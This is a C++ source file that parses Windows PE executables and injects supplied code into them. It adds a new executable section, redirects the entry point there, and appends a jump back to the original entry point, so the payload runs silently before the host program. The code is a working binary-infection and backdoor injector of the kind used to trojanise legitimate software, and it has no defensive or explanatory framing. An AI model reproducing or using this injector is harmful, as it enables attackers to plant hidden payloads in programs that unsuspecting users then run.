#include"Header.h"

DWORD64 align(DWORD64 address, DWORD64 alignment) {
	if (address + alignment < address) {
		Error("Unexpected error happened during alignment.", FALSE, TRUE, 1);
	}
	if (alignment == 0) {
		Error("Unexpected error happened during alignment.", FALSE, TRUE, 1);
	}
	return (address + alignment - 1) / alignment * alignment;
}

PE parsePEFile(LPVOID fileData) {
	PE pe{};
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileData;
	memcpy_s(&pe.dosHeader, sizeof(IMAGE_DOS_HEADER), dosHeader, sizeof(IMAGE_DOS_HEADER)); // copy DOS_HEADER
	DWORD stubSize = dosHeader->e_lfanew - (0x3c + sizeof(dosHeader->e_lfanew)); // 0x3c - e_lfanew offset
	pe.dosStub = (char*)malloc(stubSize * sizeof(char));
	memcpy_s(pe.dosStub, stubSize, (void*)((DWORD64)dosHeader + 0x3c + sizeof(dosHeader->e_lfanew)), stubSize); // copy DOS_STUB

	if (is64(dosHeader)) {
		IMAGE_NT_HEADERS64* ntHeader = (IMAGE_NT_HEADERS64*)((DWORD64)dosHeader + dosHeader->e_lfanew);
		memcpy_s(&pe.ntHeader64, sizeof(IMAGE_NT_HEADERS64), ntHeader, sizeof(IMAGE_NT_HEADERS64)); // copy NT_HEADER
		IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*)((DWORD64)ntHeader + sizeof(IMAGE_NT_SIGNATURE) + sizeof(IMAGE_FILE_HEADER) + ntHeader->FileHeader.SizeOfOptionalHeader);

		pe.sectionHeader = (IMAGE_SECTION_HEADER*)malloc(pe.ntHeader64.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
		pe.sections = (char**)malloc(pe.ntHeader64.FileHeader.NumberOfSections * sizeof(char*));
		pe.sizeSections = 0;

		for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
			memcpy_s(&pe.sectionHeader[i], sizeof(IMAGE_SECTION_HEADER), &sectionHeader[i], sizeof(IMAGE_SECTION_HEADER)); // copy SECTION_HEADERS
			pe.sections[i] = (char*)malloc(pe.sectionHeader[i].SizeOfRawData * sizeof(char));
			memcpy_s(pe.sections[i], pe.sectionHeader[i].SizeOfRawData, (void*)((DWORD64)dosHeader + pe.sectionHeader[i].PointerToRawData), pe.sectionHeader[i].SizeOfRawData); // copy SECTIONS' data
			pe.sizeSections += pe.sectionHeader[i].SizeOfRawData;
		}

		pe.sizeDosHeader = sizeof(pe.dosHeader);
		pe.sizeDosStub = stubSize;
		pe.sizeNTHeader64 = sizeof(pe.ntHeader64);
		pe.sizeSectionHeader = pe.ntHeader64.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
	}
	else {
		IMAGE_NT_HEADERS32* ntHeader = (IMAGE_NT_HEADERS32*)((DWORD64)dosHeader + dosHeader->e_lfanew);
		memcpy_s(&pe.ntHeader32, sizeof(IMAGE_NT_HEADERS32), ntHeader, sizeof(IMAGE_NT_HEADERS32)); // copy NT_HEADER
		IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*)((DWORD64)ntHeader + sizeof(IMAGE_NT_SIGNATURE) + sizeof(IMAGE_FILE_HEADER) + ntHeader->FileHeader.SizeOfOptionalHeader);

		pe.sectionHeader = (IMAGE_SECTION_HEADER*)malloc(pe.ntHeader32.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
		pe.sections = (char**)malloc(pe.ntHeader32.FileHeader.NumberOfSections * sizeof(char*));
		pe.sizeSections = 0;

		for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
			memcpy_s(&pe.sectionHeader[i], sizeof(IMAGE_SECTION_HEADER), &sectionHeader[i], sizeof(IMAGE_SECTION_HEADER)); // copy SECTION_HEADERS
			pe.sections[i] = (char*)malloc(pe.sectionHeader[i].SizeOfRawData * sizeof(char));
			memcpy_s(pe.sections[i], pe.sectionHeader[i].SizeOfRawData, (void*)((DWORD64)dosHeader + pe.sectionHeader[i].PointerToRawData), pe.sectionHeader[i].SizeOfRawData); // copy SECTIONS' data
			pe.sizeSections += pe.sectionHeader[i].SizeOfRawData;
		}

		pe.sizeDosHeader = sizeof(pe.dosHeader);
		pe.sizeDosStub = stubSize;
		pe.sizeNTHeader32 = sizeof(pe.ntHeader32);
		pe.sizeNTHeader64 = sizeof(pe.ntHeader64);
		pe.sizeSectionHeader = pe.ntHeader32.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
	}

	return pe;
}

VOID writeBinary(PE pe, char* fileName, DWORD size) {
	char* newFileData = NULL;
	HANDLE newFile = NULL;
	DWORD byteWrite = 0;

	newFileData = (char*)malloc(size);
	if ((pe.ntHeader32.OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC | pe.ntHeader64.OptionalHeader.Magic) == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
		memcpy_s(newFileData, pe.sizeDosHeader, &pe.dosHeader, pe.sizeDosHeader);
		memcpy_s(newFileData + pe.sizeDosHeader, pe.sizeDosStub, pe.dosStub, pe.sizeDosStub);
		memcpy_s(newFileData + pe.sizeDosHeader + pe.sizeDosStub, pe.sizeNTHeader64, &pe.ntHeader64, pe.sizeNTHeader64);

		for (int i = 0; i < pe.ntHeader64.FileHeader.NumberOfSections; i++) {
			memcpy_s(newFileData + pe.sizeDosHeader + pe.sizeDosStub + pe.sizeNTHeader64 + i * sizeof(IMAGE_SECTION_HEADER), sizeof(IMAGE_SECTION_HEADER), &pe.sectionHeader[i], sizeof(IMAGE_SECTION_HEADER));
			memcpy_s(newFileData + pe.sectionHeader[i].PointerToRawData, pe.sectionHeader[i].SizeOfRawData, pe.sections[i], pe.sectionHeader[i].SizeOfRawData);
		}
	}
	else {
		memcpy_s(newFileData, pe.sizeDosHeader, &pe.dosHeader, pe.sizeDosHeader);
		memcpy_s(newFileData + pe.sizeDosHeader, pe.sizeDosStub, pe.dosStub, pe.sizeDosStub);
		memcpy_s(newFileData + pe.sizeDosHeader + pe.sizeDosStub, pe.sizeNTHeader32, &pe.ntHeader32, pe.sizeNTHeader32);

		for (int i = 0; i < pe.ntHeader32.FileHeader.NumberOfSections; i++) {
			memcpy_s(newFileData + pe.sizeDosHeader + pe.sizeDosStub + pe.sizeNTHeader32 + i * sizeof(IMAGE_SECTION_HEADER), sizeof(IMAGE_SECTION_HEADER), &pe.sectionHeader[i], sizeof(IMAGE_SECTION_HEADER));
			memcpy_s(newFileData + pe.sectionHeader[i].PointerToRawData, pe.sectionHeader[i].SizeOfRawData, pe.sections[i], pe.sectionHeader[i].SizeOfRawData);
		}
	}

	newFile = CreateFile(fileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (newFile == INVALID_HANDLE_VALUE) {
		Error("Cannot Create File.", TRUE, TRUE, 1);
	}
	if (!WriteFile(newFile, newFileData, size, &byteWrite, NULL)) {
		Error("Cannot Write File.", TRUE, TRUE, 1);
	}
	CloseHandle(newFile);
}

VOID Inject(LPVOID fileData, DWORD size, char* code, DWORD codeSize, char* outPath) {
	PE pe = parsePEFile(fileData);

	if (is64(fileData)) {

		//get Entry Point base address
		DWORD64 imageBase = pe.ntHeader64.OptionalHeader.ImageBase;
		DWORD64 OEP = pe.ntHeader64.OptionalHeader.AddressOfEntryPoint;
		DWORD64 baseOEP = imageBase + OEP;
		if (baseOEP < imageBase) {
			Error("Unexpected Error.", FALSE, TRUE, 1);
		}
		char movRAX[] = "\x48\xB8"; // mov rax, 
		char hexOEP[8] = {
			baseOEP >> 0 & 0xff ,
			baseOEP >> 8 & 0xff ,
			baseOEP >> 16 & 0xff ,
			baseOEP >> 24 & 0xff ,
			baseOEP >> 32 & 0xff ,
			baseOEP >> 40 & 0xff ,
			baseOEP >> 48 & 0xff ,
			baseOEP >> 56 & 0xff ,
		};// convert entry point to hex
		char pushRAX[] = "\x50"; // push rax
		char jmp[] = "\xff\x24\x24"; //jmp [rsp]

		int injectSize = sizeof(movRAX) + sizeof(hexOEP) + sizeof(pushRAX) + sizeof(jmp) + codeSize;

		int newSection = pe.ntHeader64.FileHeader.NumberOfSections;
		pe.ntHeader64.FileHeader.NumberOfSections++;

		//allocate new section header
		IMAGE_SECTION_HEADER* newSectionHeader = (IMAGE_SECTION_HEADER*)realloc(pe.sectionHeader, sizeof(IMAGE_SECTION_HEADER)*pe.ntHeader64.FileHeader.NumberOfSections);
		if (newSectionHeader == NULL) {
			Error("Cannot allocate new section header", 0, 1, 1);
		}
		pe.sectionHeader = newSectionHeader;
		//fill up data
		pe.sectionHeader[newSection] = {};
		pe.sectionHeader[newSection].VirtualAddress = align(pe.sectionHeader[newSection - 1].VirtualAddress + pe.sectionHeader[newSection - 1].Misc.VirtualSize, pe.ntHeader64.OptionalHeader.SectionAlignment);
		memcpy_s(pe.sectionHeader[newSection].Name, 8, ".newsect", 8);
		pe.sectionHeader[newSection].PointerToRawData = pe.sectionHeader[newSection - 1].PointerToRawData + pe.sectionHeader[newSection - 1].SizeOfRawData;
		pe.sectionHeader[newSection].Misc.VirtualSize = injectSize;
		pe.sectionHeader[newSection].SizeOfRawData = align(injectSize, pe.ntHeader64.OptionalHeader.FileAlignment);
		pe.sectionHeader[newSection].Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
		//recalculate image size
		pe.ntHeader64.OptionalHeader.SizeOfImage = align(pe.sectionHeader[newSection].VirtualAddress + pe.sectionHeader[newSection].Misc.VirtualSize, pe.ntHeader64.OptionalHeader.SectionAlignment);
		//change entry point
		pe.ntHeader64.OptionalHeader.AddressOfEntryPoint = pe.sectionHeader[newSection].VirtualAddress;

		//allocate new section data
		char** newSectionData = (char**)realloc(pe.sections, pe.ntHeader64.FileHeader.NumberOfSections * sizeof(char*));
		if (newSectionData == NULL) {
			Error("Cannot allocate new section data", 0, 1, 1);
		}
		pe.sections = newSectionData;
		pe.sections[newSection] = (char*)calloc(pe.sectionHeader[newSection].SizeOfRawData, 1);

		//copy data to section
		memcpy(pe.sections[newSection], code, codeSize - 1);
		memcpy(pe.sections[newSection] + codeSize - 1, movRAX, sizeof(movRAX));
		memcpy(pe.sections[newSection] + codeSize + sizeof(movRAX) - 2, hexOEP, sizeof(hexOEP));
		memcpy(pe.sections[newSection] + codeSize + sizeof(movRAX) + sizeof(hexOEP) - 2, pushRAX, sizeof(pushRAX));
		memcpy(pe.sections[newSection] + codeSize + sizeof(movRAX) + sizeof(hexOEP) + sizeof(pushRAX) - 3, jmp, sizeof(jmp));

		writeBinary(pe, outPath, size + pe.sectionHeader[newSection].SizeOfRawData);
	}
	else {

		//get Entry Point base address
		DWORD64 imageBase = pe.ntHeader32.OptionalHeader.ImageBase;
		DWORD64 OEP = pe.ntHeader32.OptionalHeader.AddressOfEntryPoint;
		DWORD64 baseOEP = imageBase + OEP;
		if (baseOEP < imageBase) {
			Error("Unexpected Error.", FALSE, TRUE, 1);
		}

		char push[] = "\x68"; // push to esp
		char hexOEP[4] = {
			baseOEP >> 0 & 0xff ,
			baseOEP >> 8 & 0xff ,
			baseOEP >> 16 & 0xff ,
			baseOEP >> 24 & 0xff ,
		};// convert entry point to hex
		char jmp[] = "\xff\x24\x24"; //jmp [esp]

		int injectSize = sizeof(push) + sizeof(jmp) + sizeof(hexOEP) + codeSize;

		int newSection = pe.ntHeader32.FileHeader.NumberOfSections;
		pe.ntHeader32.FileHeader.NumberOfSections++;

		//allocate new section header
		IMAGE_SECTION_HEADER* newSectionHeader = (IMAGE_SECTION_HEADER*)realloc(pe.sectionHeader, sizeof(IMAGE_SECTION_HEADER)*pe.ntHeader32.FileHeader.NumberOfSections);
		if (newSectionHeader == NULL) {
			Error("Cannot allocate new section header", 0, 1, 1);
		}
		pe.sectionHeader = newSectionHeader;
		//fill up data
		pe.sectionHeader[newSection] = {};
		pe.sectionHeader[newSection].VirtualAddress = align(pe.sectionHeader[newSection - 1].VirtualAddress + pe.sectionHeader[newSection - 1].Misc.VirtualSize, pe.ntHeader32.OptionalHeader.SectionAlignment);
		memcpy_s(pe.sectionHeader[newSection].Name, 8, ".newsect", 8);
		pe.sectionHeader[newSection].PointerToRawData = pe.sectionHeader[newSection - 1].PointerToRawData + pe.sectionHeader[newSection - 1].SizeOfRawData;
		pe.sectionHeader[newSection].Misc.VirtualSize = injectSize;
		pe.sectionHeader[newSection].SizeOfRawData = align(injectSize, pe.ntHeader32.OptionalHeader.FileAlignment);
		pe.sectionHeader[newSection].Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
		//recalculate image size
		pe.ntHeader32.OptionalHeader.SizeOfImage = align(pe.sectionHeader[newSection].VirtualAddress + pe.sectionHeader[newSection].Misc.VirtualSize, pe.ntHeader32.OptionalHeader.SectionAlignment);
		//change entry point
		pe.ntHeader32.OptionalHeader.AddressOfEntryPoint = pe.sectionHeader[newSection].VirtualAddress;

		//allocate new section data
		char** newSectionData = (char**)realloc(pe.sections, pe.ntHeader32.FileHeader.NumberOfSections * sizeof(char*));
		if (newSectionData == NULL) {
			Error("Cannot allocate new section data", 0, 1, 1);
		}
		pe.sections = newSectionData;
		pe.sections[newSection] = (char*)calloc(pe.sectionHeader[newSection].SizeOfRawData, 1);

		//copy data to section
		memcpy(pe.sections[newSection], code, codeSize);
		memcpy(pe.sections[newSection] + codeSize - 1, push, sizeof(push));
		memcpy(pe.sections[newSection] + codeSize + sizeof(push) - 2, hexOEP, sizeof(hexOEP));
		memcpy(pe.sections[newSection] + codeSize + sizeof(push) + sizeof(hexOEP) - 2, jmp, sizeof(jmp));

		writeBinary(pe, outPath, size + pe.sectionHeader[newSection].SizeOfRawData);
	}
}